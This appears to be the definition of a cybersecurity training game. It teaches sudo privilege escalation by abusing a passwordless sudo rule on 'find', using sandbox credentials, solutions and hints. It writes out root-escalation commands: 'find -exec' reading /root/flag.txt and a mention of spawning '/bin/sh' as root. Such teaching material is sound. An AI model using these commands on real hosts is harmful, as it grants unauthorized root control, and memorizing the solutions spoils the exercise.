title: Privilege Escalation — sudo Misconfiguration
description: You have a low-privilege foothold on a Meridian Systems server. Abuse a careless passwordless sudo rule to escalate to root and read a protected flag.
outcomes: Enumerate sudo privileges on a compromised account with sudo -l.
Explain why granting sudo on binaries like find, vim or awk is equivalent to granting full root.
Use find's -exec action to run an arbitrary command as root and read a protected file.

levels.title: Introduction
levels.content:
# General information — please read carefully

* Each level builds on the previous one. Do not skip ahead.
* If you get stuck, use the hints — or search for the technique online.
* This exercise is for educational purposes only. Only attack systems within your sandbox.

# Storyline

You are a junior penetration tester at SecureWave Ltd. During an engagement against **Meridian Systems** you recovered credentials for the shared `webadmin` account and now have an SSH foothold.

`webadmin` is a low-privilege user — it cannot read `/root/flag.txt`. But the DevOps team granted it a 'harmless' passwordless sudo rule to help with log cleanup. Harmless sudo rules are rarely harmless. Your task: enumerate that rule and abuse it to become root.

levels.title: Get Access
levels.cloud_content:
SSH to your attacker machine at **10.1.34.23**, then log in to the target as the compromised `webadmin` account:

```
ssh webadmin@10.1.34.10
# password: Deploy2024!
```

The target server is at **10.1.34.10** (SSH port 22). Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
The target SSH service is running locally on port **2222**:

```
sshpass -p 'Deploy2024!' ssh -o StrictHostKeyChecking=no -p 2222 webadmin@127.0.0.1
```

Submit **start** to begin.

levels.title: Enumerate Your sudo Rights
levels.content:
The first thing any attacker does after landing on a host is check what the current user is allowed to run with sudo. The `sudo -l` command lists the sudo rules for your account — and because the rule here is passwordless, it will not even prompt you.

Run it as `webadmin`:

```
sudo -l
```

Look at the output. It will show a line like `(root) NOPASSWD: /usr/bin/<something>`. That single binary is your path to root.

**Which binary is webadmin allowed to run as root without a password?** (give the command name only, not the full path)
levels.solution:
```
$ sudo -l
User webadmin may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

The allowed binary is **find**.

hints.title: How do I list sudo rules?
hints.content: `sudo -l` prints the commands the current user may run via sudo. With a NOPASSWD rule it runs without prompting for a password.

hints.title: What am I looking for?
hints.content: Look for the line containing `NOPASSWD:`. The path after it (e.g. `/usr/bin/find`) is the binary you can run as root. The answer is the last part of that path.

levels.title: Understand Why find Is Dangerous
levels.content:
Being allowed to run `find` as root does not sound dangerous — until you remember what `find` can do. GNU `find` has an action called `-exec` that runs an arbitrary command for every file it matches.

If `find` runs as root, then the command launched by `-exec` also runs as root. Sites like GTFOBins catalogue exactly this kind of abuse for dozens of common binaries.

Test the idea by having root-find run `id` for you:

```
sudo /usr/bin/find /etc/hostname -exec id \;
```

The `/etc/hostname` argument is just a file that is guaranteed to exist so `find` has one match to act on. Look at the `id` output — if it shows `uid=0(root)`, you are executing commands as root.

**Which `find` action (the flag/option) lets you run an arbitrary command as root?**
levels.solution:
```
$ sudo /usr/bin/find /etc/hostname -exec id \;
uid=0(root) gid=0(root) groups=0(root)
```

The command runs as root. The dangerous action is **-exec**.

hints.title: What runs the command?
hints.content: `find <path> -exec <command> \;` runs `<command>` once per matched file. The trailing `\;` terminates the -exec clause (escaped so the shell does not eat the semicolon).

hints.title: Why does it run as root?
hints.content: Because sudo runs `find` itself as root, any child process find spawns via `-exec` inherits root privileges. The whole point of GTFOBins is that 'run X as root' usually means 'become root'.

levels.title: Escalate and Read the Flag
levels.content:
You have confirmed you can run commands as root through `find -exec`. Now use it to read the protected flag at `/root/flag.txt` — a file `webadmin` cannot read directly.

Replace `id` with `cat /root/flag.txt`:

```
sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \;
```

In a real engagement you would instead run `-exec /bin/sh \;` to drop into a full interactive root shell, giving you complete control of the host.

**Submit the flag from /root/flag.txt.**

hints.title: How do I read the flag?
hints.content: Swap the `id` command for `cat /root/flag.txt` inside the -exec clause: `sudo /usr/bin/find /etc/hostname -exec cat /root/flag.txt \;`.

hints.title: What format is the flag?
hints.content: The flag starts with `WMG{` and ends with `}`.

levels.title: Feedback
levels.instructions: Please answer these questions to help us improve the game.

questions.text: How difficult did you find this game?
Before this game, had you heard of GTFOBins / sudo abuse?

choices.text: Yes, I had used it before
I had heard of it but not tried it

questions.text: How clear were the level instructions?
What would you change or add to improve this game?
